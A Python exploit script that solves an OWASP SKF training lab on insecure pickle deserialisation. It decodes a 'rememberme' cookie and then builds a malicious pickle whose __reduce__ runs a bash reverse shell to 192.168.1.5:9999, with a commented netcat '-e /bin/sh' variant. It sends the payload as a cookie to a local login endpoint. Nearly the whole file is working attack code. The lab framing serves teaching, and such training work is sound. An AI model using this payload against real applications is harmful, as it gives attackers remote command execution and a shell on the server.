### This is a automation/solution to OWASP SKF Labs | KBID XXX - Deserialisation Pickle made by Charalampos Theodorou at 22/07/2022

import pickle, base64, os, requests


#This is the class that the web application serialize using pickle 
class usr:
    def __init__(self, username, password):
        self.username = username
        self.password = password
		
#this is taken from the web app
rememberme = "gASVSAAAAAAAAACMCF9fbWFpbl9flIwDdXNylJOUKYGUfZQojAh1c2VybmFtZZSMCG93YXNwc2tmlIwIcGFzc3dvcmSUjAhwNDU1dzByZJR1Yi4="

#I will try to deserialize the data and then made the serialization again
serialdata = base64.b64decode(rememberme)

print("This is the serialized data: ", serialdata)

deserialdata = pickle.loads(serialdata)

print("\nThis is the class we are dealing with")
print(deserialdata.__class__)

print("\nAnd these are the mothods available")
print(dir(deserialdata))

print("\nCalling username and password methods")
print("Username: ", deserialdata.username)
print("Username: ", deserialdata.password)

print("Lets make our own serilize data")

#username = input("username= ")
#password = input("password= ")

localserialdata = usr(deserialdata.username,deserialdata.password)
#,"username":username, "password": password}
localserialdata = pickle.dumps(localserialdata)

print("This is the serialized data from the web app: ")
print(serialdata)
print("This is the data i create localy")
print(localserialdata)

#Now that we know how this works lets try the RCE
#We will serialize a payload class that has the __reduce__ magic method that the usr has.

class payload(object):
  def __reduce__(self):
    #return (os.system,(f"nc -nv 192.168.1.5 9999 -e /bin/sh",))
    return (os.system,(f"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/9999 0>&1'",))


deserialpayload = payload()
serialpayload = pickle.dumps(deserialpayload)
rememberme = base64.b64encode(serialpayload)
print("So our final base64 encoded pickle serialized payload is the one below:")
rememberme = rememberme.decode('utf-8')
print(rememberme)


#We will send it to the application. In our case the app is running at http://127.0.0.1:5000
# Dont forget the nc -nlvp 9999
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


target = "http://127.0.0.1:5000/login"

cookies = {"rememberme":rememberme}

r = requests.get(target, verify=False, proxies=proxies, cookies=cookies)









